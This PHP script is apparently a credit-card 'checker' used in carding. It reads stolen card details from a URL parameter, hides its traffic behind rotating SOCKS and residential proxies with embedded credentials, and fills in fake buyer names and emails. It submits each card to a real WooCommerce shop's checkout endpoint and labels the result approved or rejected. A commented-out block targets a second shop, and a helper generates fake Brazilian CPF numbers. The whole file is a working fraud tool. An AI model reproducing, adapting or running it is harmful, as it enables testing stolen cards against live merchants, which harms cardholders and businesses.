<?php

require 'agents.php';



set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');



function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$binn = substr($cc,0,6);


if(strlen($mes<='09')){
        $mes1=substr($mes,1,2);
    } else {
        $mes1=$mes;
    }
$cc1 = substr($cc,0,4);
$cc2 = substr($cc,4,4);
$cc3 = substr($cc,8,4);
$cc4 = substr($cc,12,4);
$cc5 = substr($cc,0,4);
$cc6 = substr($cc,4,6);
$cc7 = substr($cc,10,5);


if($cbin == "3"){
    $cardnum = "$cc5 $cc6 $cc7";
}else{
   $cardnum = "$cc1 $cc2 $cc3 $cc4";
}

If(strlen($ano) > 2)
{
  $ano1 = substr($ano,2,2);
}
 function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false) {
return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividiendo,$divisor)
{
return round($dividiendo - (floor($dividiendo/$divisor)*$divisor));
}

function cpf($compontos)
{
$n1 = rand(0,9);
$n2 = rand(0,9);
$n3 = rand(0,9);
$n4 = rand(0,9);
$n5 = rand(0,9);
$n6 = rand(0,9);
$n7 = rand(0,9);
$n8 = rand(0,9);
$n9 = rand(0,9);
$d1 = $n9*2+$n8*3+$n7*4+$n6*5+$n5*6+$n4*7+$n3*8+$n2*9+$n1*10;
$d1 = 11 - ( mod($d1,11) );
if ( $d1 >= 10 )
{ $d1 = 0 ;
}
$d2 = $d1*2+$n9*3+$n8*4+$n7*5+$n6*6+$n5*7+$n4*8+$n3*9+$n2*10+$n1*11;
$d2 = 11 - ( mod($d2,11) );
if ($d2>=10) { $d2 = 0 ;}
$retorno = '';
if ($compontos==1) {$retorno = ''.$n1.$n2.$n3.$n4.$n5.$n6.$n7.$n8.$n9.$d1.$d2;}
return $retorno;
}

function datosnombre(){
  $nombre = file("lista_nombres.txt");
    $minombre = rand(0, sizeof($nombre)-1);
    $nombre = $nombre[$minombre];
  return $nombre;
}
function datosapellido(){
  $apellido = file("lista_apellidos.txt");
    $miapellido = rand(0, sizeof($apellido)-1);
    $apellido = $apellido[$miapellido];
  return $apellido;
}


function email($nombre){
  $email = preg_replace('<\W+>', "", $nombre).rand(0000,9999)."@hotmail.com";
  return $email;
}

///$cpf = cpf(1);
$nombre = datosnombre();
$apellido = datosapellido();
// $email = email($nombre);
$zip = substr(str_shuffle(str_repeat("0123456789", 5)), 0, 5);
$idb = substr(str_shuffle(str_repeat("0123456789", 9)), 0, 9);
$username = 'lum-customer-hl_6366aa06-zone-static_res';
$password = 'a9by3kql965v';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

$ad1 = substr(str_shuffle(str_repeat("0123456789", 2)), 0, 2);
$city = substr(str_shuffle(str_repeat("abcdefghijklmnopqrstuvwxyz", 5)), 0, 5);

function ibuuproxy(){
  $poxySocks = file("Socks5.txt");
   $myproxy = rand(0, sizeof($poxySocks)-1);
   $poxySocks = $poxySocks[$myproxy];
 return $poxySocks;
}

$poxySocks5 = ibuuproxy();

$fname = 'Justin'.rand(abcdefghijklmnopqrstuvwxyz,999).'';
$lname = 'Wang';
$email1 = $fname.'.'.$lname.''.rand(10,99999).'@yopmail.com';
 // $email2 = $fname.rand(10,999).'@yopmail.com';
// //$password = 'P@5%Word';
// $password2 = 'Hansabhen1@';
$counters = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
$counters2 = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);

$dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);








// curl_close($ch);



// $ch = curl_init();
// curl_setopt($ch, CURLOPT_URL, 'https://www.quantumtouch.com/en/quantum-touch-store/your-cart/checkout/task-step/step-4');
// curl_setopt($ch, CURLOPT_HEADER, 0);
// curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//    curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
//    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
// // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
// curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
// 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
// 'accept-encoding: gzip, deflate, br',
// 'accept-language: en-US,en;q=0.9',
// 'content-type: multipart/form-data; boundary=----WebKitFormBoundaryeMSkUB9d8i5CjiBw',
// 'cookie: 0379e85b77dcc4500d7c3d4c7cd784d5=s56o1q6vrodd6jf48c89k8mn1d; _omappvp=3Hl62xhIhX1y4sM5s7xB6YcwG3bua4fDN8ZB0ePaLqIzjgJVA7adCxtPZR9NzZEWdy9C17OUSRWWt9QTl6VTCzQ9RQfb8YHk',
// 'origin: https://www.quantumtouch.com',
// 'referer: https://www.quantumtouch.com/en/quantum-touch-store/your-cart/checkout/task-step/step-3',
// 'user-agent: '.$browser.''
// ));

// curl_setopt($ch, CURLOPT_POSTFIELDS, '');


// $b_pago = curl_exec($ch);

// $token = trim(strip_tags(getstr($b_pago,'"nonce":"','"')));
//  $country = trim(strip_tags(getstr($b_pago,'"issuingCountry":"','"')));
//  $bank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
//  $type = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
//  $category = trim(strip_tags(getstr($a_pago,'"card_category":"','"')));
//  $brand = trim(strip_tags(getstr($a_pago,' "card_brand":"','"')));


  // echo $b_pago;

// echo $token;

// echo $ccnum;
// echo $mes1;
// echo $ano;
// echo $cvv;

// // //////////////////////// START REQUEST 2 ////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://madtoto.com/?wc-ajax=checkout');

//////////////////////// PROXY CALLS ////////////////////////////
//               REMOVE '//' FOR PROXIES TO WORK BELOW

//////////////////////// PROXYSCRAPE
// curl_setopt($ch, CURLOPT_PROXY, '199.247.30.187:8080');
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
//////////////////////// WEBSHARE
// curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:1080');
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "vxrpebmq-rotate:a0fdakb6ts8a");

//////////////////////// MANUAL Proxy List
curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);// CHANGE TYPE ACCORDING TO LIST

//////////////////////// LUMINATI
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
// End Proxy Calls
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
// curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PATCH');
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/javascript, */*; q=0.01',
'accept-encoding: gzip, deflate, br',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: gdpr[consent_types]=%5B%5D; gdpr[allowed_cookies]=%5B%22gdpr%5Bconsent_types%5D%22%2C%22gdpr%5Ballowed_cookies%5D%22%2C%22PHPSESSID%22%2C%22gdprprivacy_bar%22%2C%22wordpress_sec_%7Bhash%7D%22%2C%22wordpress_logged_in_%7Bhash%7D%22%2C%22wfwaf-authcookie-%7Bhash%7D%22%2C%22woocommerce_items_in_cart%22%2C%22woocommerce_cart_hash%22%2C%22wp_woocommerce_session_%7Bhash%7D%22%2C%22__stripe_mid%22%2C%22__stripe_sid%22%2C%22__EC_TEST__%22%2C%22wordpress_test_cookie%22%2C%22jetpack_blog_subscribe_%7Bhash%7D%22%2C%22tk_ai%22%2C%22tk_qs%22%2C%22tk_or%22%2C%22tk_r3d%22%2C%22tk_lr%22%2C%22tk_tc%22%2C%22_ga%22%2C%22_gid%22%2C%22_gat%22%2C%22_gat_gtag_UA_7195390_6%22%5D; pum-17632=true; woocommerce_items_in_cart=1; wp_woocommerce_session_854a37d15f11b45c5f7a497628ab5148=4f2e38bab45b1cfa41222992570c67f8%7C%7C1592548475%7C%7C1592544875%7C%7C5a371dc18b5c8591c7a34e1868c7481d; woocommerce_cart_hash=d4ed21e4b8889bf497b2f8be03a66905; __stripe_mid=83a52057-8504-4bf6-a2b0-1e2b0df992a4; __stripe_sid=543bec75-ba3b-46f7-a2a8-40ac8393700d',
'origin: https://madtoto.com',
'referer: https://madtoto.com/checkout/',
'user-agent: '.$browser.''
));

//////////////////////// START POST FILED 1 ////////////////////////

curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Vincnet&billing_last_name=Warner&billing_company=&billing_country=US&billing_address_1=12+avenue&billing_address_2=&billing_city=Miami&billing_state=FL&billing_postcode=33101&billing_phone=5182641524&billing_email=pubgkittu%40gmail.com&wcal_guest_capture_nonce=6fc9af9751&_wp_http_referer=%2Fcheckout%2F&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=Select+a+country+%2F+region%E2%80%A6&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&shipping_phone=&order_comments=&shipping_method%5B0%5D=free_shipping%3A1&payment_method=usa_epay_credit_card&wc-usa-epay-credit-card-account-number='.$cc.'&wc-usa-epay-credit-card-expiry='.$mes.'+%2F+'.$ano1.'&wc-usa-epay-credit-card-csc='.$cvv.'&terms=on&terms-field=1&woocommerce-process-checkout-nonce=5c60fe2d9e&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');

// // // // //*****************************************************************************************************************************************************************************************************************************************************************************


$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:'.curl_error($ch);
}
curl_close($ch);

//////////////////////// START POST FILED 1 ////////////////////////


$message = trim(strip_tags(getstr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\t','\t\t<\/li>\n\t<\/ul>\n"')));
// $code = trim(strip_tags(getstr($result,'"errorCode":"','"')));
// // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));



// // // /////////////////////// RESULT ////////////////////////////////////
if(strpos($result,'"result":"success"')){
// updatecart();
      echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
    }
elseif(strpos($result,'Not Acceptable!')) {

            echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [E R R O R]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';

  }

else {
              echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
  }
curl_close($curl);
ob_flush();
     echo $result;
?>
